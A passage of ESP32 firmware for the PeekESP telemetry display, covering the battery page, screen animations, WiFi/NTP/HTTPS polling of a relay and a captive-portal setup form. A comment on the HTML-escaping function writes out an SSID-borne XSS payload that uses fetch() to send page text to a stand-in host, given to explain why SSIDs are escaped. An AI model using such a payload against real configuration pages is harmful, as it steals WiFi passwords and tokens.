  const bool    charging = g_batt_charging;
  const uint8_t pct      = g_batt_pct;
  char buf[40];

  if (absent) {
    lv_label_set_text(g_pwr_pct, "--");
    lv_label_set_text(g_pwr_volts, "no reading");
    lv_label_set_text(g_pwr_state, "NO BATTERY");
    lv_obj_set_style_text_color(g_pwr_state, COL_TEXT_DIM, 0);
  } else if (charging) {
    // No percentage while something external is holding the node up, and this
    // is the honest part: that voltage is the charger's, not the cell's state
    // of charge. A charger pins the node near 4.2 V from the moment it is
    // plugged in, so reporting a percentage from it reads "100 %" against an
    // almost empty battery - which is precisely what it did, and why pulling
    // the cable appeared to drop it to a fifth in an instant. Nothing dropped;
    // the number was never a measurement of the battery.
    lv_label_set_text(g_pwr_pct, LV_SYMBOL_CHARGE);
    snprintf(buf, sizeof buf, "%.2f V", volts);
    lv_label_set_text(g_pwr_volts, buf);
    lv_label_set_text(g_pwr_state, "USB POWER");
    lv_obj_set_style_text_color(g_pwr_state, COL_GREEN, 0);
  } else {
    lv_label_set_text_fmt(g_pwr_pct, "%u%%", (unsigned)pct);
    snprintf(buf, sizeof buf, "%.2f V", volts);
    lv_label_set_text(g_pwr_volts, buf);
    lv_label_set_text(g_pwr_state, "ON BATTERY");
    lv_obj_set_style_text_color(g_pwr_state, COL_AMBER, 0);
  }

  lv_obj_set_style_bg_color(g_pwr_fill,
                            charging ? COL_GREEN :
                            pct > 50 ? COL_GREEN : pct > 20 ? COL_AMBER : COL_RED, 0);
  if (charging && !absent) lv_obj_clear_flag(g_pwr_bolt, LV_OBJ_FLAG_HIDDEN);
  else                     lv_obj_add_flag(g_pwr_bolt, LV_OBJ_FLAG_HIDDEN);

  // Animated only when this page is actually being looked at; setting a width
  // on a hidden object every two seconds is just work nobody sees.
  if (lv_obj_has_flag(g_pwr_panel, LV_OBJ_FLAG_HIDDEN)) return;

  static bool sweeping = false;
  lv_anim_del(g_pwr_fill, obj_set_w);

  if (charging && !absent) {
    // A repeating sweep, not a level. The same reasoning as the missing
    // percentage: while a charger is holding the node up there is no
    // measurement of how full the cell is, and a bar filled to the brim would
    // assert one. A sweep says "power is going in" and claims nothing else.
    sweeping = true;
    lv_anim_t fill;
    lv_anim_init(&fill);
    lv_anim_set_var(&fill, g_pwr_fill);
    lv_anim_set_exec_cb(&fill, obj_set_w);
    lv_anim_set_values(&fill, 0, 102);
    lv_anim_set_time(&fill, 1400);
    lv_anim_set_repeat_count(&fill, LV_ANIM_REPEAT_INFINITE);
    lv_anim_set_repeat_delay(&fill, 250);
    lv_anim_set_path_cb(&fill, lv_anim_path_ease_in_out);
    lv_anim_start(&fill);
    return;
  }

  lv_anim_t fill;
  lv_anim_init(&fill);
  lv_anim_set_var(&fill, g_pwr_fill);
  lv_anim_set_exec_cb(&fill, obj_set_w);
  // Coming off the sweep the bar is at whatever width the animation was
  // passing through, which is not where the level is - start from 0 so it
  // fills to the real value instead of jumping backwards from a random point.
  lv_anim_set_values(&fill, sweeping ? 0 : lv_obj_get_width(g_pwr_fill),
                     (102 * pct) / 100);
  lv_anim_set_time(&fill, 400);
  lv_anim_set_path_cb(&fill, lv_anim_path_ease_out);
  lv_anim_start(&fill);
  sweeping = false;
}

static void view_slide_in_done(lv_anim_t *a) {
  (void)a;
  g_sliding = false;
}

// Every machine, then the board's own power page. One carousel, so there is a
// single gesture to learn and no screen that can appear without being asked
// for.
static uint8_t page_count() {
  // Machines, then the clock, then power. The last two always exist, so a
  // device that has never heard from a machine still has somewhere to go.
  return (uint8_t)(g_shown.n + 2);
}

static lv_obj_t *page_obj(uint8_t page) {
  if (page <  g_shown.n) return g_body;
  if (page == g_shown.n) return g_clk_panel;
  return g_pwr_panel;
}

// Halfway: the outgoing page is off-screen, so this is the one moment where
// swapping pages and values at once is invisible.
static void view_slide_swap(lv_anim_t *a) {
  (void)a;
  lv_obj_t *from = page_obj(g_view);
  lv_obj_t *to   = page_obj(g_view_pending);
  g_view = g_view_pending;

  if (from != to) {
    lv_obj_add_flag(from, LV_OBJ_FLAG_HIDDEN);
    lv_obj_set_x(from, 0);            // park it where it belongs for next time
    lv_obj_clear_flag(to, LV_OBJ_FLAG_HIDDEN);
  }
  lv_obj_set_x(to, g_slide_dir * SCREEN_W);
  render_selected();

  lv_anim_t in;
  lv_anim_init(&in);
  lv_anim_set_var(&in, to);
  lv_anim_set_exec_cb(&in, obj_set_x);
  lv_anim_set_values(&in, g_slide_dir * SCREEN_W, 0);
  lv_anim_set_time(&in, 190);
  lv_anim_set_path_cb(&in, lv_anim_path_ease_out);
  lv_anim_set_ready_cb(&in, view_slide_in_done);
  lv_anim_start(&in);
}

static void view_step(int8_t step) {
  // Ignoring a press mid-swipe rather than queueing it: a queued swipe arrives
  // after the animation people were already reading, which feels like a lag
  // rather than a second step. And nothing swipes underneath the pairing
  // overlay, which is covering all of it anyway.
  if (g_sliding || pairing_showing()) return;

  const uint8_t pages = page_count();
  if (pages < 2) return;

  g_view_pending = (uint8_t)((g_view + pages + step) % pages);
  g_slide_dir    = step;
  g_sliding      = true;

  lv_anim_t out;
  lv_anim_init(&out);
  lv_anim_set_var(&out, page_obj(g_view));
  lv_anim_set_exec_cb(&out, obj_set_x);
  lv_anim_set_values(&out, 0, -g_slide_dir * SCREEN_W);
  lv_anim_set_time(&out, 150);
  lv_anim_set_path_cb(&out, lv_anim_path_ease_in);
  lv_anim_set_ready_cb(&out, view_slide_swap);
  lv_anim_start(&out);
}

// ---------------------------------------------------------------------------
//  Core 1 - LVGL, and only LVGL.
// ---------------------------------------------------------------------------
static void uiTask(void *arg) {
  (void)arg;
  uint32_t last_tick = millis();
  for (;;) {
    const uint32_t now = millis();
#if LV_TICK_CUSTOM == 0
    lv_tick_inc(now - last_tick);      // lv_conf.h keeps LV_TICK_CUSTOM at 0
#endif
    last_tick = now;
    // In standby the panel is off, so every frame is work nobody can see.
    // The tick above still advances, so animations do not resume mid-sweep
    // from a stale timebase when the screen comes back.
    // lv_timer_handler returns how long until its next timer is due. Sleeping
    // that long instead of a flat 5 ms means core 1 wakes ~200 times a second
    // during an animation and a handful of times a second when nothing is
    // moving, rather than 200 times a second always. Clamped at both ends:
    // never busier than every 2 ms, never less responsive than every 30 ms,
    // because a button press has to be picked up promptly either way.
    uint32_t idle = 30;
    if (!g_standby) {
      idle = lv_timer_handler();
      if (idle > 30) idle = 30;
      if (idle < 2)  idle = 2;
    } else {
      idle = 100;
    }
    vTaskDelay(pdMS_TO_TICKS(idle));      // yield to IDLE1 / the watchdog
  }
}

// ============================================================================
//  Core 0 - WiFi, NTP, HTTPS. Never touches an LVGL object.
// ============================================================================
static bool wifi_connect(uint32_t timeout_ms) {
  if (WiFi.status() == WL_CONNECTED) return true;

  g_state = NET_WIFI;
  WiFi.mode(WIFI_STA);
  // Modem sleep ON. It was off to remove ~100 ms of latency jitter, which was
  // a poor trade: this device talks for a fraction of a second every 5 s, and
  // keeping the radio receiver powered the rest of the time costs roughly
  // 60-80 mA continuously. On a board whose 3.3 V comes from a linear
  // regulator, that current is also heat - (5.0-3.3) x I, burned in a SOT-223
  // package - which is most of why the board runs warm. The animations hide
  // the extra latency entirely.
  //
  // Only reached from netTask, so the access point in setup mode is
  // unaffected; a sleeping radio there could drop clients mid-configuration.
  WiFi.setSleep(true);
  WiFi.setAutoReconnect(true);
  WiFi.begin(cfg.wifi_ssid, cfg.wifi_pass);

  const uint32_t start = millis();
  while (WiFi.status() != WL_CONNECTED) {
    if (millis() - start > timeout_ms) return false;
    vTaskDelay(pdMS_TO_TICKS(250));
  }
  Serial.printf("[net] wifi ok, %s rssi %d\n", WiFi.localIP().toString().c_str(), WiFi.RSSI());
  mark_wifi_good();
  return true;
}

static bool time_sync(uint32_t timeout_ms) {
  // The ESP32 boots at epoch 0 with no battery-backed RTC, and TLS checks
  // certificate validity dates, so a device with no clock cannot complete a
  // handshake - and fails it without saying why.
  g_state = NET_TIME;
  // configTzTime rather than configTime: the epoch is the same either way and
  // TLS only cares about that, but localtime() then gives Dhaka time without
  // every caller having to remember to add six hours.
  configTzTime(TZ_DHAKA, "pool.ntp.org", "time.google.com");

  const uint32_t start = millis();
  while (time(nullptr) < 1700000000) {          // ~Nov 2023, i.e. "plausible"
    if (millis() - start > timeout_ms) return false;
    vTaskDelay(pdMS_TO_TICKS(250));
  }
  return true;
}

static void parse_one(JsonObjectConst o, Telemetry &out) {
  out.cpu_percent      = o["cpu_percent"]      | 0.0f;
  out.ram_percent      = o["ram_percent"]      | 0.0f;
  out.storage_percent  = o["storage_percent"]  | 0.0f;
  out.storage_total_gb = o["storage_total_gb"] | 0.0f;
  out.storage_free_gb  = o["storage_free_gb"]  | 0.0f;
  out.cpu_temp_c       = o["cpu_temp_c"]       | -1.0f;
  out.battery_percent  = o["battery_percent"]  | -1;
  out.battery_minutes  = o["battery_minutes"]  | -1;
  out.battery_charging = o["battery_charging"] | false;
  out.battery_ac       = o["battery_ac"]       | false;
  out.rx_kbps          = o["net_rx_kbps"]      | 0.0f;
  out.tx_kbps          = o["net_tx_kbps"]      | 0.0f;
  out.uptime_seconds   = o["uptime_seconds"]   | 0u;
  out.age_s            = o["age_s"]            | 0u;   // relay only
  strlcpy(out.host, o["host"] | "dietpi", sizeof out.host);
}

static bool parse_payload(const String &payload, DeviceSet &out) {
  // ArduinoJson 7 sizes itself; 6 needs the capacity up front.
#if ARDUINOJSON_VERSION_MAJOR >= 7
  JsonDocument doc;
#else
  // Six machines of ten fields each, plus the top-level copy of the freshest.
  // Static sizing cannot stretch and a document one byte short fails the whole
  // parse, which would look exactly like the relay being down.
  DynamicJsonDocument doc(4096);
#endif
  const DeserializationError err = deserializeJson(doc, payload);
  if (err) {
    Serial.printf("[json] %s\n", err.c_str());
    return false;
  }

  out.n = 0;

  // The relay returns every machine behind the code in one response, which is
  // what keeps a display costing one request no matter how many it shows.
  JsonArrayConst devices = doc["devices"];
  if (!devices.isNull()) {
    for (JsonObjectConst o : devices) {
      if (out.n >= MAX_DEVICES) break;
      parse_one(o, out.d[out.n++]);
    }
  }

  // A relay older than multi-device support returns a single flat object, and
  // so does an agent polled directly. Both are still perfectly valid.
  if (!out.n) {
    parse_one(doc.as<JsonObjectConst>(), out.d[out.n++]);
  }
  return true;
}

// --- RELAY: HTTPS to the Cloudflare Worker the host pushes into -------------
static bool fetch_relay(DeviceSet &out, uint32_t &latency_ms) {
  if (cfg.relay_url[0] == '\0') {
    Serial.println("[relay] no URL configured");
    return false;
  }

  // Stack-allocating the TLS client means its ~40 KB of session state is
  // released the moment this function returns, rather than being held for the
  // 5 seconds until the next poll.
  WiFiClientSecure tls;
  if (cfg.tls_verify) tls.setCACert(RELAY_ROOT_CAS);
  else                tls.setInsecure();          // portal escape hatch
  tls.setTimeout(HTTP_TIMEOUT_MS / 1000);         // WiFiClient's unit is seconds
  tls.setHandshakeTimeout(HTTP_TIMEOUT_MS / 1000);

  HTTPClient http;
  http.setReuse(false);
  http.setConnectTimeout(HTTP_TIMEOUT_MS);
  http.setTimeout(HTTP_TIMEOUT_MS);

  const uint32_t t0 = millis();
  if (!http.begin(tls, cfg.relay_url)) {
    Serial.println("[relay] bad URL");
    return false;
  }
  http.addHeader("Authorization", String("Bearer ") + cfg.relay_token);
  // Cloudflare's edge rejects some generic client user agents outright with
  // error 1010, before the Worker ever runs - which surfaces as an opaque 403
  // that looks nothing like an auth problem. Identify ourselves properly.
  http.setUserAgent("PeekESP-device/1.0");

  const int code = http.GET();
  if (code != HTTP_CODE_OK) {
    // 401 means the token is wrong and will never fix itself; 503 means the
    // Worker is up but the host has not pushed anything yet. Both are worth
    // distinguishing from a generic timeout in the log.
    Serial.printf("[relay] GET -> %d%s\n", code,
                  code == 401 ? " (token rejected)" :
                  code == 503 ? " (worker has no data yet)" : "");
    http.end();
    return false;
  }

  const String payload = http.getString();
  latency_ms = millis() - t0;
  http.end();
  return parse_payload(payload, out);
}

static bool fetch(DeviceSet &out, uint32_t &latency_ms) {
  return fetch_relay(out, latency_ms);
}

static void netTask(void *arg) {
  (void)arg;

  // Two honest attempts, then hand it back rather than retrying a wrong
  // password until the heat death of the universe. A device that cannot join
  // the network has exactly one useful next step, and it is reconfiguration -
  // so it goes there itself instead of waiting for someone to know about the
  // button.
  for (uint8_t tries = 1; !wifi_connect(25000); tries++) {
    g_state = NET_ERROR;
    Serial.printf("[net] attempt %u to join '%s' failed\n", tries, cfg.wifi_ssid);
    // Only bail out to setup if this network has never worked. If it has,
    // the router is the likelier problem and the device keeps trying.
    if (tries >= 2 && !wifi_known_good()) {
      g_wifi_failed = true;
      Serial.println("[net] never connected with these credentials - reopening setup");
      vTaskDelay(pdMS_TO_TICKS(4000));    // long enough to read the screen
      request_setup_mode();
      vTaskDelay(pdMS_TO_TICKS(300));
      esp_restart();
    }
    if (tries >= 2) {
      Serial.println("[net] this network has worked before - staying and retrying");
    }
    vTaskDelay(pdMS_TO_TICKS(1500));
  }
  // TLS validates certificate dates, so the clock has to be real before the
  // first request. A device stuck at epoch 0 fails the handshake, silently.
  if (!time_sync(20000)) Serial.println("[net] NTP timed out - TLS will likely fail");


  uint8_t  failures = 0;
  uint32_t batt_at  = 0;      // next battery sample, owned by this core

  for (;;) {
    if (WiFi.status() != WL_CONNECTED) {
      g_state = NET_ERROR;
      WiFi.reconnect();
      vTaskDelay(pdMS_TO_TICKS(2000));
      continue;
    }

    DeviceSet fresh;
    uint32_t  latency = 0;

    g_busy = true;
    const bool ok = fetch(fresh, latency);
    g_busy = false;

    if (ok) {
      if (xSemaphoreTake(g_lock, pdMS_TO_TICKS(100)) == pdTRUE) {
        g_devset = fresh;
        xSemaphoreGive(g_lock);
        g_latency      = latency;
        g_device_count = fresh.n;
        g_seq++;                 // publish last: the UI polls on this
      }
      // A reachable relay holding old data is a different fault from an
      // unreachable one: the network is fine, the host stopped reporting.
      // Showing LINK OK over frozen numbers would be the worst outcome.
      //
      // With several machines this asks about the freshest: one of them being
      // switched off is that machine's business, and the dashboard says so on
      // its own row rather than condemning the whole link.
      g_state  = (fresh.freshest_age_s() > STALE_AFTER_S) ? NET_STALE : NET_ONLINE;
      failures = 0;
    } else {
      g_state = NET_ERROR;
      if (failures < 255) failures++;
    }

    // If the whole stack has been wedged for a minute, a clean reboot beats
    // sitting there showing stale numbers. Rebooting also re-runs NTP, which
    // is what a clock-related TLS failure needs anyway.
    if (failures >= MAX_CONSECUTIVE_FAILURES) {
      Serial.println("[net] too many consecutive failures - restarting");
      vTaskDelay(pdMS_TO_TICKS(200));
      esp_restart();
    }

    // Sleep in slices so a button press can cut the wait short - and use the
    // slices. This core is otherwise idle between polls while core 1 is the
    // one that must never block, so the ADC sampling belongs here.
    const uint32_t wake = millis() + (uint32_t)cfg.poll_s * 1000u;
    while ((int32_t)(millis() - wake) < 0 && !g_force) {
      if (g_reboot_at) break;
      if ((int32_t)(millis() - batt_at) >= 0) {
        batt_at = millis() + 2000;
        battery_sample();
      }
      vTaskDelay(pdMS_TO_TICKS(50));
    }

    // Nothing is on screen in standby, so polling would spend requests and
    // radio time on numbers nobody is looking at. Waking sets g_force, so the
    // first thing that happens on the way back is a fresh reading. The battery
    // is still sampled, so the power page is correct the moment it reappears
    // rather than showing whatever was true when the screen went off.
    while (g_standby && !g_force && !g_reboot_at) {
      if ((int32_t)(millis() - batt_at) >= 0) {
        batt_at = millis() + 2000;
        battery_sample();
      }
      vTaskDelay(pdMS_TO_TICKS(200));
    }
    g_force = false;
  }
}

// ============================================================================
//  Setup portal - a captive access point serving the configuration form.
//
//  Everything typed here (the WiFi passphrase, a read token) crosses a
//  local WPA2 link in plain HTTP. That is a deliberate trade: TLS would need
//  a certificate no phone would trust, and the alternative - typing a 44
//  character token with two buttons - is not a real alternative. The AP
//  is up only while you are configuring, and its password is per-device.
// ============================================================================
static const char PAGE_CSS[] PROGMEM =
  "<!doctype html><meta charset=utf-8>"
  "<meta name=viewport content='width=device-width,initial-scale=1'>"
  "<title>PeekESP setup</title><style>"
  "*{box-sizing:border-box}"
  "body{margin:0;padding:20px;background:#05070E;color:#E6EDF7;"
  "font:15px/1.5 ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}"
  "main{max-width:520px;margin:0 auto}"
  "h1{font-size:20px;margin:0 0 2px;color:#00E5FF;letter-spacing:.06em}"
  "p.sub{margin:0 0 22px;color:#5C6B82;font-size:13px}"
  "fieldset{border:1px solid #1A2334;border-radius:8px;padding:14px 14px 4px;"
  "margin:0 0 16px;background:#0B1220}"
  "legend{color:#5C6B82;font-size:12px;letter-spacing:.12em;padding:0 6px}"
  "label{display:block;margin:0 0 12px}"
  "span{display:block;font-size:12px;color:#5C6B82;margin-bottom:4px}"
  "input[type=text],input[type=password],input[type=number],select{width:100%;"
  "padding:9px 10px;border:1px solid #1A2334;border-radius:6px;background:#05070E;"
  "color:#E6EDF7;font:inherit}"
  "input:focus,select:focus{outline:none;border-color:#00E5FF}"
  ".row{display:flex;gap:10px}.row label{flex:1}"
  "label.chk{display:flex;align-items:center;gap:8px;color:#E6EDF7;font-size:14px}"
  "label.chk span{margin:0;color:#E6EDF7;font-size:14px}"
  "button{width:100%;padding:12px;border:0;border-radius:6px;background:#00E5FF;"
  "color:#05070E;font:600 15px/1 inherit;letter-spacing:.04em;cursor:pointer}"
  "a.reset{display:block;text-align:center;margin-top:14px;color:#FF4D6D;font-size:13px}"
  "p.hint{margin:-4px 0 12px;font-size:12px;line-height:1.45;color:#5C6B82}"
  "p.by{text-align:center;margin:22px 0 0;font-size:12px;color:#5C6B82}"
  "p.by a{color:#00E5FF;text-decoration:none}"
  "</style>";

/**
 * Escape text before it goes into the page.
 *
 * An SSID is not our data - it is a string any access point within range can
 * choose. Dropped into HTML unescaped, a neighbour who names their network
 *   "><script>fetch('http://x/?t='+document.body.innerText)</script>
 * gets script execution on the configuration page, which is where the WiFi
 * password and the read token are typed. Being in radio range is the only
 * access required.
 */
static String html_escape(const String &in) {
  String out;
  out.reserve(in.length() + 16);
  for (size_t i = 0; i < in.length(); i++) {
    const char c = in[i];
    switch (c) {
      case '&':  out += F("&amp;");  break;
      case '<':  out += F("&lt;");   break;
      case '>':  out += F("&gt;");   break;
      case '"':  out += F("&quot;"); break;
      case '\'': out += F("&#39;");  break;
      default:   out += c;
    }
  }
  return out;
}

static String field(const char *label, const char *name, const char *value,
                    const char *type = "text") {
  String s = F("<label><span>");
  s += label;
  s += F("</span><input type=");
  s += type;
  s += F(" name=");
  s += name;
  s += F(" value=\"");
  s += html_escape(value);         // stored config, but an SSID came from the air
  s += F("\"></label>");
  return s;
}

static void handle_root() {
  String p = FPSTR(PAGE_CSS);
  p += F("<main><h1>PeekESP</h1><p class=sub>");
  p += g_ap_ssid;
  p += F(" &middot; settings are saved to flash and survive a reflash of the"
         " sketch.</p><form method=POST action=/save>");

  p += F("<fieldset><legend>WIFI</legend>");

  // scanComplete(): -1 still running, -2 failed/not started, else a count.
  const int n = WiFi.scanComplete();

  if (n == WIFI_SCAN_RUNNING) {
    // Reload rather than render an empty list. A picker that silently shows
    // nothing is indistinguishable from a device that cannot see any networks.
    p += F("<p class=hint>Scanning for networks...</p>"
           "<meta http-equiv=refresh content=2>");
  } else if (n <= 0) {
    p += F("<p class=hint>No networks found. "
           "<a href=/rescan>Scan again</a></p>");
  } else {
    p += F("<label><span>Network</span><select name=ssid id=ssid "
           "onchange=\"m.hidden=this.value!=''\">");

    // Strongest first, and only once each: a mesh or an extender puts the same
    // SSID in the list several times, which makes the menu look broken.
    bool used[24] = {false};
    const int shown = n > 24 ? 24 : n;
    for (int slot = 0; slot < shown; slot++) {
      int best = -1;
      for (int i = 0; i < shown; i++) {
        if (used[i] || WiFi.SSID(i).length() == 0) continue;
        if (best == -1 || WiFi.RSSI(i) > WiFi.RSSI(best)) best = i;
      }
      if (best == -1) break;
      used[best] = true;

      const String ssid = WiFi.SSID(best);
      for (int i = 0; i < shown; i++) {          // suppress duplicates
        if (!used[i] && WiFi.SSID(i) == ssid) used[i] = true;
      }

      // A percentage and a padlock, rather than the "|||*" this used to
      // print - which read as noise stuck on the end of the network name.
      // The usual dBm-to-quality mapping: -50 and better is full, -100 is none.
      int quality = 2 * (WiFi.RSSI(best) + 100);
      if (quality > 100) quality = 100;
      if (quality < 0) quality = 0;

      const String safe = html_escape(ssid);
      p += F("<option value=\"");
      p += safe;
      p += F("\"");
      if (ssid == cfg.wifi_ssid) p += F(" selected");
      p += F(">");
      p += safe;
      p += F("  —  ");
      p += quality;
      p += F("%");
      if (WiFi.encryptionType(best) != WIFI_AUTH_OPEN) p += F("  🔒");
      else                                             p += F("  open");
      p += F("</option>");
    }
    // Empty string as the sentinel: a zero-length SSID is not valid, so it
    // cannot collide with a real network, and it survives a form POST intact
    // where a control character would not.
    p += F("<option value=\"\">Other / hidden network...</option>"
           "</select></label>");

    // Revealed only when "Other" is picked, so a hidden SSID is still possible
    // without putting a second confusing text box in front of everyone.
    p += F("<label id=m hidden><span>Network name</span>"
           "<input type=text name=ssid_manual value=\"\"></label>");
    p += F("<p class=hint><a href=/rescan>Scan again</a></p>");
  }

  p += field("Password", "pass", cfg.wifi_pass, "password");
  p += F("</fieldset>");

  // Pairing is the normal route and needs nothing here - the code on the
  // device's own screen fills the fields below in. They exist for a named or
  // private stream, where you were given a URL and token directly.
  p += F("<fieldset><legend>RELAY</legend>"
         "<p class=hint>If you paired this device from the PeekESP app, these "
         "are already set and there is nothing to do here.</p>");
  p += field("Worker URL", "rurl", cfg.relay_url);
  p += field("Read token", "rtok", cfg.relay_token);
  p += F("<label><span>Poll seconds</span><input type=number name=poll min=1 max=600 value=");
  p += cfg.poll_s;
  p += F("></label>");
  p += F("<label class=chk><input type=checkbox name=tlsv value=1 ");
  if (cfg.tls_verify) p += F("checked");
  p += F("><span>Verify TLS certificate</span></label>"
         "<p class=hint>Leave verification on. Turn it off only if Cloudflare "
         "rotates to a CA that is not pinned in ca_certs.h - it makes the "
         "connection interceptable.</p></fieldset>");

  p += F("<button type=submit>SAVE &amp; REBOOT</button></form>"
         "<a class=reset href=/reset>erase all settings</a>"
         "<p class=by>PeekESP by <a href=\"https://github.com/shouravx\">shouravx</a>"
         " &middot; <a href=\"https://github.com/shouravx/PeekESP\">source</a></p>"
         "</main>");

  server.send(200, "text/html", p);
}

static void copy_arg(const char *name, char *dst, size_t n) {
  if (!server.hasArg(name)) return;
  strlcpy(dst, server.arg(name).c_str(), n);
}

static void handle_save() {
  // "Other / hidden" puts a sentinel in the dropdown and the real name in a
  // second field, so the manual value wins when it is present.
  if (server.hasArg("ssid_manual") && server.arg("ssid_manual").length())
    copy_arg("ssid_manual", cfg.wifi_ssid, sizeof cfg.wifi_ssid);
  else if (server.arg("ssid").length())
    copy_arg("ssid",   cfg.wifi_ssid,   sizeof cfg.wifi_ssid);
  copy_arg("pass",   cfg.wifi_pass,   sizeof cfg.wifi_pass);
  copy_arg("rurl",   cfg.relay_url,   sizeof cfg.relay_url);
  copy_arg("rtok",   cfg.relay_token, sizeof cfg.relay_token);

  cfg.tls_verify = server.hasArg("tlsv");
  // A URL typed in here means a named or private stream, not a paired one.
  if (server.hasArg("rurl") && cfg.relay_url[0]) cfg.transport = TRANSPORT_RELAY;
  if (server.hasArg("poll"))   cfg.poll_s  = server.arg("poll").toInt();
  if (cfg.poll_s < 1)   cfg.poll_s = 1;
  if (cfg.poll_s > 600) cfg.poll_s = 600;

  config_save();
  forget_wifi_good();          // new credentials are unproven until they work

  String p = FPSTR(PAGE_CSS);
  p += F("<main><h1>Saved</h1><p class=sub>Rebooting into the dashboard. This"
         " access point is about to disappear - that is expected.</p></main>");
  server.send(200, "text/html", p);

  // Restart from the task loop, not here: the response still has to drain.
  g_reboot_at = millis() + 1200;
}

static void handle_rescan() {
  // Async: the redirect lands on "/" which renders the scanning state and
  // refreshes itself, so the page is never blocked on the radio.
  WiFi.scanDelete();
  WiFi.scanNetworks(true);
  server.sendHeader("Location", "/");
  server.send(302, "text/plain", "");
}

static void handle_reset() {
  config_erase();
  String p = FPSTR(PAGE_CSS);
  p += F("<main><h1>Erased</h1><p class=sub>Back to factory defaults."
         " Rebooting into setup mode.</p></main>");
  server.send(200, "text/html", p);
  g_reboot_at = millis() + 1200;
}

static void setupTask(void *arg) {
  (void)arg;

  // AP_STA rather than plain AP so the scan that fills the SSID dropdown can
  // run without tearing the access point down under the phone that is on it.
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(g_ap_ssid, g_ap_pass);
  vTaskDelay(pdMS_TO_TICKS(300));
  WiFi.scanNetworks(true);                 // async; the form reads whatever is ready

  dns.setErrorReplyCode(DNSReplyCode::NoError);
  dns.start(53, "*", WiFi.softAPIP());     // wildcard -> captive portal prompt

  server.on("/", handle_root);
  server.on("/save", HTTP_POST, handle_save);
  server.on("/reset", handle_reset);
  server.on("/rescan", handle_rescan);
  server.onNotFound(handle_root);          // any URL lands on the form
  server.begin();

  Serial.printf("[setup] AP %s / %s at %s\n",
                g_ap_ssid, g_ap_pass, WiFi.softAPIP().toString().c_str());

  for (;;) {
    dns.processNextRequest();
    server.handleClient();
    if (g_reboot_at && (int32_t)(millis() - g_reboot_at) >= 0) {
      server.stop();
      dns.stop();
      vTaskDelay(pdMS_TO_TICKS(100));
      esp_restart();
    }
    vTaskDelay(pdMS_TO_TICKS(5));
  }
}

// ============================================================================
//  Entry points
// ============================================================================
void setup() {
  Serial.begin(115200);
  delay(100);
  Serial.println("\n[peek] booting");

  // Waking from deep sleep is a fresh boot, so without this there is no way to
  // tell "it woke up" from "it reset" - which is exactly the distinction you
  // need when a board is not coming back from sleep.
  if (esp_sleep_get_wakeup_cause() == ESP_SLEEP_WAKEUP_EXT0) {
    Serial.println("[peek] woke from sleep (right button)");
  }

  // The divider that brings the cell out to GPIO34 is behind a MOSFET. Left
  // low, the pin reads a floating node - which looks like a flat battery
  // rather than like a measurement that never happened.
  pinMode(PIN_ADC_EN, OUTPUT);
  digitalWrite(PIN_ADC_EN, HIGH);
  analogReadResolution(12);
  analogSetPinAttenuation(PIN_ADC_BAT, ADC_11db);

  // Most ESP32s carry a measured reference in eFuse; the ones that do not are
  // out by up to 10 %, which on a battery is the difference between "20 %" and
  // "flat". Using the real figure where it exists costs one call at boot.
  // ADC_ATTEN_DB_12, not DB_11: on core 2.0.17 the 11 dB name is a deprecated
  // alias for exactly this value, and #ifdef cannot guard it because both are
  // enumerators rather than macros.
  esp_adc_cal_characteristics_t adc_chars;
  if (esp_adc_cal_characterize(ADC_UNIT_1, ADC_ATTEN_DB_12, ADC_WIDTH_BIT_12,
                               1100, &adc_chars) == ESP_ADC_CAL_VAL_EFUSE_VREF) {
    g_vref_scale = adc_chars.vref / 1100.0f;
    Serial.printf("[power] eFuse Vref %u mV\n", (unsigned)adc_chars.vref);
  }

  // One reading before anything else starts. The periodic sampling lives on
  // core 0 inside netTask, which does not get going until WiFi is up - and a
  // device joining a slow network would otherwise report NO BATTERY to anyone
  // who swiped to the power page while it was still trying.
  battery_sample();

  pinMode(PIN_BTN_L, INPUT_PULLUP);
  pinMode(PIN_BTN_R, INPUT);      // GPIO35 is input-only; the board pulls it up

  g_lock = xSemaphoreCreateMutex();
  config_load();

  const uint64_t mac = ESP.getEfuseMac();
  snprintf(g_ap_ssid, sizeof g_ap_ssid, "PeekESP-%04X", (unsigned)(mac >> 32) & 0xFFFF);
  snprintf(g_ap_pass, sizeof g_ap_pass, "peek%06X",     (unsigned)(mac & 0xFFFFFF));

  // Three ways into setup mode: nothing configured yet, the left button held
  // at power-on, or a request left in NVS by a long-press during normal use.
  const bool held = (digitalRead(PIN_BTN_L) == LOW);
  g_setup_mode = !config_usable() || held || consume_setup_request();

  tft.init();
  tft.setRotation(1);             // landscape, 240x135
  tft.fillScreen(TFT_BLACK);

  // tft.init() drives the backlight pin directly; take it over for PWM and
  // hold it dark so the first frame is never a flash of uninitialised RAM.
  backlight_init();
  backlight_set(0);

  lv_init();
  lv_disp_draw_buf_init(&draw_buf, lv_buf, NULL, SCREEN_W * 40);

  static lv_disp_drv_t disp_drv;
  lv_disp_drv_init(&disp_drv);
  disp_drv.hor_res  = SCREEN_W;
  disp_drv.ver_res  = SCREEN_H;
  disp_drv.flush_cb = disp_flush;
  disp_drv.draw_buf = &draw_buf;
  lv_disp_drv_register(&disp_drv);

  if (g_setup_mode) {
    build_setup_ui();
  } else {
    // A paired device with no code yet has just been flashed: invent one,
    // keep it, and derive the URL and token from it. Nothing to type in.
    if (cfg.transport == TRANSPORT_PAIRED) {
      if (cfg.pair_code[0] == '\0') {
        pair_new_code(cfg.pair_code, sizeof cfg.pair_code);
        config_save();
        Serial.printf("[pair] new code %s\n", cfg.pair_code);
      }
      pair_apply(cfg);
    }

    build_dashboard_ui();
    // Before the pairing overlay, so pairing wins at boot: a device that has
    // never been paired has something more useful to say than its own voltage.
    build_clock_dated(lv_scr_act());
    build_power_panel(lv_scr_act());
    // The overlay sits on top until the first reading arrives, so a freshly
    // flashed device shows its code rather than a dashboard full of zeroes.
    if (cfg.transport == TRANSPORT_PAIRED) build_pair_overlay(lv_scr_act());
    build_splash(lv_scr_act());        // last, so it covers everything above
    lv_timer_create(ui_sync_cb, 120, NULL);
  }

  // Paint frame 0 before the lights come up. lv_refr_now() rather than
  // lv_timer_handler() because no ticks have elapsed yet, so the refresh
  // timer would not consider itself due and the fade-in would reveal an
  // uninitialised panel.
  lv_refr_now(NULL);

  const uint8_t level = BL_LEVELS[cfg.bl_idx];
  for (int d = 0; d <= level; d += 5) {   // ~400 ms fade-in
    backlight_set(d);
    delay(8);
  }
  backlight_set(level);

  // Core 0 is the core that is ALLOWED to block - that is the whole point of
  // the split - so the idle-task watchdog on it is fundamentally at odds with
  // this design and has to go:
  //
